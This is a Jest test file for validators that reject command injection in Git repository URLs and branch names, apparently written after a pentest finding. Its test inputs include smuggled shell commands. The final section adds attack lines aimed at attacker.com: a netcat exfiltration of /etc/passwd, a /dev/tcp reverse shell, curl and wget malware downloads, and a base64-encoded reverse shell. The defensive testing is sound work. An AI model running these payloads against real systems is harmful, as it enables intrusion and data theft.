/**
 * Command Injection Mitigation Tests
 * 
 * Tests to verify that the command injection vulnerability in workflow execution
 * is properly mitigated through input validation.
 * 
 * Vulnerability: Workflow repository inputs enable authenticated command execution
 * - Repository URL and branch inputs were interpolated directly into shell commands
 * - Shell metacharacters could be injected to execute arbitrary commands
 * - Mitigation: Strict validation of Git repository URLs and branch names
 */

const {
  validateGitRepositoryUrl,
  validateGitBranch
} = require('../../api-server/server/lib/path-validator');

describe('Command Injection Mitigation - Git Repository URL Validation', () => {
  describe('Valid Repository URLs', () => {
    test('should accept valid HTTPS repository URL with .git extension', () => {
      const url = 'https://github.com/user/repo.git';
      const result = validateGitRepositoryUrl(url);
      expect(result).toBe(url);
    });

    test('should accept valid HTTPS repository URL without .git extension', () => {
      const url = 'https://github.com/user/repo';
      const result = validateGitRepositoryUrl(url);
      expect(result).toBe(url);
    });

    test('should accept valid SSH repository URL', () => {
      const url = 'git@github.com:user/repo.git';
      const result = validateGitRepositoryUrl(url);
      expect(result).toBe(url);
    });

    test('should accept repository URLs with hyphens and underscores', () => {
      const url = 'https://github.com/my-org/my_repo-name.git';
      const result = validateGitRepositoryUrl(url);
      expect(result).toBe(url);
    });

    test('should accept repository URLs with nested paths', () => {
      const url = 'https://gitlab.com/group/subgroup/project.git';
      const result = validateGitRepositoryUrl(url);
      expect(result).toBe(url);
    });

    test('should trim whitespace from valid repository URL', () => {
      const url = '  https://github.com/user/repo.git  ';
      const result = validateGitRepositoryUrl(url);
      expect(result).toBe('https://github.com/user/repo.git');
    });
  });

  describe('Command Injection Prevention - Repository URLs', () => {
    test('should reject repository URL with semicolon command separator', () => {
      const url = 'https://github.com/user/repo.git; id; #';
      const result = validateGitRepositoryUrl(url);
      expect(result).toBeNull();
    });

    test('should reject repository URL with pipe command separator', () => {
      const url = 'https://github.com/user/repo.git | cat /etc/passwd';
      const result = validateGitRepositoryUrl(url);
      expect(result).toBeNull();
    });

    test('should reject repository URL with ampersand command separator', () => {
      const url = 'https://github.com/user/repo.git & whoami';
      const result = validateGitRepositoryUrl(url);
      expect(result).toBeNull();
    });

    test('should reject repository URL with backtick command substitution', () => {
      const url = 'https://github.com/user/repo.git`id`';
      const result = validateGitRepositoryUrl(url);
      expect(result).toBeNull();
    });

    test('should reject repository URL with dollar sign command substitution', () => {
      const url = 'https://github.com/user/repo.git$(whoami)';
      const result = validateGitRepositoryUrl(url);
      expect(result).toBeNull();
    });

    test('should reject repository URL with parentheses', () => {
      const url = 'https://github.com/user/repo.git()';
      const result = validateGitRepositoryUrl(url);
      expect(result).toBeNull();
    });

    test('should reject repository URL with angle brackets (redirection)', () => {
      const url = 'https://github.com/user/repo.git > /tmp/output';
      const result = validateGitRepositoryUrl(url);
      expect(result).toBeNull();
    });

    test('should reject repository URL with newline character', () => {
      const url = 'https://github.com/user/repo.git\nid';
      const result = validateGitRepositoryUrl(url);
      expect(result).toBeNull();
    });

    test('should reject repository URL with carriage return', () => {
      const url = 'https://github.com/user/repo.git\rid';
      const result = validateGitRepositoryUrl(url);
      expect(result).toBeNull();
    });

    test('should reject repository URL with tab character', () => {
      const url = 'https://github.com/user/repo.git\tid';
      const result = validateGitRepositoryUrl(url);
      expect(result).toBeNull();
    });

    test('should reject repository URL with null byte', () => {
      const url = 'https://github.com/user/repo.git\x00id';
      const result = validateGitRepositoryUrl(url);
      expect(result).toBeNull();
    });

    test('should reject repository URL with control characters', () => {
      const url = 'https://github.com/user/repo.git\x1Fid';
      const result = validateGitRepositoryUrl(url);
      expect(result).toBeNull();
    });
  });

  describe('Repository URL Edge Cases', () => {
    test('should reject null repository URL', () => {
      const result = validateGitRepositoryUrl(null);
      expect(result).toBeNull();
    });

    test('should reject undefined repository URL', () => {
      const result = validateGitRepositoryUrl(undefined);
      expect(result).toBeNull();
    });

    test('should reject empty string repository URL', () => {
      const result = validateGitRepositoryUrl('');
      expect(result).toBeNull();
    });

    test('should reject whitespace-only repository URL', () => {
      const result = validateGitRepositoryUrl('   ');
      expect(result).toBeNull();
    });

    test('should reject non-string repository URL', () => {
      const result = validateGitRepositoryUrl(123);
      expect(result).toBeNull();
    });

    test('should reject repository URL exceeding length limit', () => {
      const url = 'https://github.com/' + 'a'.repeat(2100) + '/repo.git';
      const result = validateGitRepositoryUrl(url);
      expect(result).toBeNull();
    });

    test('should reject repository URL without proper protocol', () => {
      const url = 'github.com/user/repo.git';
      const result = validateGitRepositoryUrl(url);
      expect(result).toBeNull();
    });

    test('should reject repository URL with invalid protocol', () => {
      const url = 'ftp://github.com/user/repo.git';
      const result = validateGitRepositoryUrl(url);
      expect(result).toBeNull();
    });
  });
});

describe('Command Injection Mitigation - Git Branch Name Validation', () => {
  describe('Valid Branch Names', () => {
    test('should accept valid branch name "main"', () => {
      const branch = 'main';
      const result = validateGitBranch(branch);
      expect(result).toBe(branch);
    });

    test('should accept valid branch name "develop"', () => {
      const branch = 'develop';
      const result = validateGitBranch(branch);
      expect(result).toBe(branch);
    });

    test('should accept branch name with forward slash', () => {
      const branch = 'feature/new-feature';
      const result = validateGitBranch(branch);
      expect(result).toBe(branch);
    });

    test('should accept branch name with hyphens', () => {
      const branch = 'feature-branch-name';
      const result = validateGitBranch(branch);
      expect(result).toBe(branch);
    });

    test('should accept branch name with underscores', () => {
      const branch = 'feature_branch_name';
      const result = validateGitBranch(branch);
      expect(result).toBe(branch);
    });

    test('should accept branch name with dots (not at start)', () => {
      const branch = 'release/1.0.0';
      const result = validateGitBranch(branch);
      expect(result).toBe(branch);
    });

    test('should accept branch name with numbers', () => {
      const branch = 'release-2024';
      const result = validateGitBranch(branch);
      expect(result).toBe(branch);
    });

    test('should trim whitespace from valid branch name', () => {
      const branch = '  main  ';
      const result = validateGitBranch(branch);
      expect(result).toBe('main');
    });
  });

  describe('Command Injection Prevention - Branch Names', () => {
    test('should reject branch name with semicolon command separator', () => {
      const branch = 'main; id; #';
      const result = validateGitBranch(branch);
      expect(result).toBeNull();
    });

    test('should reject branch name with pipe command separator', () => {
      const branch = 'main | cat /etc/passwd';
      const result = validateGitBranch(branch);
      expect(result).toBeNull();
    });

    test('should reject branch name with ampersand command separator', () => {
      const branch = 'main & whoami';
      const result = validateGitBranch(branch);
      expect(result).toBeNull();
    });

    test('should reject branch name with backtick command substitution', () => {
      const branch = 'main`id`';
      const result = validateGitBranch(branch);
      expect(result).toBeNull();
    });

    test('should reject branch name with dollar sign command substitution', () => {
      const branch = 'main$(whoami)';
      const result = validateGitBranch(branch);
      expect(result).toBeNull();
    });

    test('should reject branch name with parentheses', () => {
      const branch = 'main()';
      const result = validateGitBranch(branch);
      expect(result).toBeNull();
    });

    test('should reject branch name with angle brackets', () => {
      const branch = 'main > /tmp/output';
      const result = validateGitBranch(branch);
      expect(result).toBeNull();
    });

    test('should reject branch name with newline character', () => {
      const branch = 'main\nid';
      const result = validateGitBranch(branch);
      expect(result).toBeNull();
    });

    test('should reject branch name with carriage return', () => {
      const branch = 'main\rid';
      const result = validateGitBranch(branch);
      expect(result).toBeNull();
    });

    test('should reject branch name with tab character', () => {
      const branch = 'main\tid';
      const result = validateGitBranch(branch);
      expect(result).toBeNull();
    });

    test('should reject branch name with null byte', () => {
      const branch = 'main\x00id';
      const result = validateGitBranch(branch);
      expect(result).toBeNull();
    });

    test('should reject branch name with control characters', () => {
      const branch = 'main\x1Fid';
      const result = validateGitBranch(branch);
      expect(result).toBeNull();
    });
  });

  describe('Git Branch Name Rules', () => {
    test('should reject branch name starting with dot', () => {
      const branch = '.hidden-branch';
      const result = validateGitBranch(branch);
      expect(result).toBeNull();
    });

    test('should reject branch name starting with hyphen', () => {
      const branch = '-invalid-branch';
      const result = validateGitBranch(branch);
      expect(result).toBeNull();
    });

    test('should reject branch name ending with .lock', () => {
      const branch = 'feature.lock';
      const result = validateGitBranch(branch);
      expect(result).toBeNull();
    });

    test('should reject branch name ending with forward slash', () => {
      const branch = 'feature/';
      const result = validateGitBranch(branch);
      expect(result).toBeNull();
    });

    test('should reject branch name with double dots', () => {
      const branch = 'feature..branch';
      const result = validateGitBranch(branch);
      expect(result).toBeNull();
    });

    test('should reject branch name with tilde', () => {
      const branch = 'feature~branch';
      const result = validateGitBranch(branch);
      expect(result).toBeNull();
    });

    test('should reject branch name with caret', () => {
      const branch = 'feature^branch';
      const result = validateGitBranch(branch);
      expect(result).toBeNull();
    });

    test('should reject branch name with colon', () => {
      const branch = 'feature:branch';
      const result = validateGitBranch(branch);
      expect(result).toBeNull();
    });

    test('should reject branch name with question mark', () => {
      const branch = 'feature?branch';
      const result = validateGitBranch(branch);
      expect(result).toBeNull();
    });

    test('should reject branch name with asterisk', () => {
      const branch = 'feature*branch';
      const result = validateGitBranch(branch);
      expect(result).toBeNull();
    });

    test('should reject branch name with square bracket', () => {
      const branch = 'feature[branch]';
      const result = validateGitBranch(branch);
      expect(result).toBeNull();
    });

    test('should reject branch name with backslash', () => {
      const branch = 'feature\\branch';
      const result = validateGitBranch(branch);
      expect(result).toBeNull();
    });

    test('should reject branch name with space', () => {
      const branch = 'feature branch';
      const result = validateGitBranch(branch);
      expect(result).toBeNull();
    });

    test('should reject branch name with @{', () => {
      const branch = 'feature@{branch}';
      const result = validateGitBranch(branch);
      expect(result).toBeNull();
    });
  });

  describe('Branch Name Edge Cases', () => {
    test('should reject null branch name', () => {
      const result = validateGitBranch(null);
      expect(result).toBeNull();
    });

    test('should reject undefined branch name', () => {
      const result = validateGitBranch(undefined);
      expect(result).toBeNull();
    });

    test('should reject empty string branch name', () => {
      const result = validateGitBranch('');
      expect(result).toBeNull();
    });

    test('should reject whitespace-only branch name', () => {
      const result = validateGitBranch('   ');
      expect(result).toBeNull();
    });

    test('should reject non-string branch name', () => {
      const result = validateGitBranch(123);
      expect(result).toBeNull();
    });

    test('should reject branch name exceeding length limit', () => {
      const branch = 'a'.repeat(300);
      const result = validateGitBranch(branch);
      expect(result).toBeNull();
    });
  });
});

describe('Real-World Attack Scenarios', () => {
  test('should reject pentest reproduction payload in repository URL', () => {
    // From pentest: repository URL with command injection
    const url = 'https://github.com/user/repo.git; id; #';
    const result = validateGitRepositoryUrl(url);
    expect(result).toBeNull();
  });

  test('should reject pentest reproduction payload in branch name', () => {
    // From pentest: branch name with command injection
    const branch = 'x; id; #';
    const result = validateGitBranch(branch);
    expect(result).toBeNull();
  });

  test('should reject command injection with environment variable extraction', () => {
    const branch = 'main; env > /tmp/secrets; #';
    const result = validateGitBranch(branch);
    expect(result).toBeNull();
  });

  test('should reject command injection with file exfiltration', () => {
    const branch = 'main; cat /etc/passwd | nc attacker.com 1234; #';
    const result = validateGitBranch(branch);
    expect(result).toBeNull();
  });

  test('should reject command injection with reverse shell', () => {
    const branch = 'main; bash -i >& /dev/tcp/attacker.com/1234 0>&1; #';
    const result = validateGitBranch(branch);
    expect(result).toBeNull();
  });

  test('should reject command injection with curl download', () => {
    const url = 'https://github.com/user/repo.git; curl -O http://attacker.com/malware.sh; #';
    const result = validateGitRepositoryUrl(url);
    expect(result).toBeNull();
  });

  test('should reject command injection with wget download', () => {
    const url = 'https://github.com/user/repo.git; wget http://attacker.com/malware.sh; #';
    const result = validateGitRepositoryUrl(url);
    expect(result).toBeNull();
  });

  test('should reject command injection with base64 encoded payload', () => {
    const branch = 'main; echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vMTIzNCAwPiYx" | base64 -d | bash; #';
    const result = validateGitBranch(branch);
    expect(result).toBeNull();
  });

  test('should reject command injection with subshell execution', () => {
    const branch = 'main$(id)';
    const result = validateGitBranch(branch);
    expect(result).toBeNull();
  });

  test('should reject command injection with command substitution', () => {
    const branch = 'main`whoami`';
    const result = validateGitBranch(branch);
    expect(result).toBeNull();
  });
});
